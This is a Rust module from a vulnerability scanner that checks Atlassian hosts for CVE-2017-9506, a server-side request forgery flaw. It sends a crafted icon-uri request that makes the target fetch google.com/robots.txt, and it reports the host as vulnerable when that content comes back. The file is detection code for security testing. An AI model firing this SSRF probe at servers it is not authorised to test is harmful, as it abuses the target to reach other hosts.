use crate::scanner::{
    module,
    findings,
    Scan,
    Target,
};


pub struct Cve2017_9506{}

impl module::BaseModule for Cve2017_9506 {
    fn name(&self) -> String {
        return "http/atlassian/cve-2017-9506".to_string();
    }

    fn description(&self) -> String {
        return "Check for CVE-2017-9506 (SSRF)".to_string();
    }

    fn author(&self) -> String {
        return "Sylvain Kerkour <sylvain@kerkour.com>".to_string();
    }

    fn version(&self) -> String {
        return "0.1.0".to_string();
    }
}

impl module::PortModule for Cve2017_9506 {
    fn run(&self, _: &Scan, target: &Target, port: &findings::Port) -> (Option<findings::Data>, Vec<String>) {
        let errs = vec!();
        let mut ret = None;

        let protocol = if port.http {
            "http"
        } else if port.https {
            "https"
        } else {
            ""
        };

        if protocol == "" {
            return (ret, errs);
        }

        let url = format!("{}://{}:{}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com/robots.txt", &protocol, &target.host, &port.id);
        let body = reqwest::get(&url)
            .expect("error fetching url for Cve2017_95_06")
            .text()
            .expect("error getting body to txt").to_lowercase();

        if body.contains("user-agent: *") && body.contains("disallow") {
            ret = Some(findings::Data::Url(findings::Url{
                url,
            }));
        }

        return (ret, errs);
    }
}


#[cfg(test)]
mod tests {
    use crate::scanner::module::BaseModule;

    #[test]
    fn module_name() {
        let module = super::Cve2017_9506{};
        assert_eq!("http/atlassian/cve-2017-9506", module.name());
    }
}
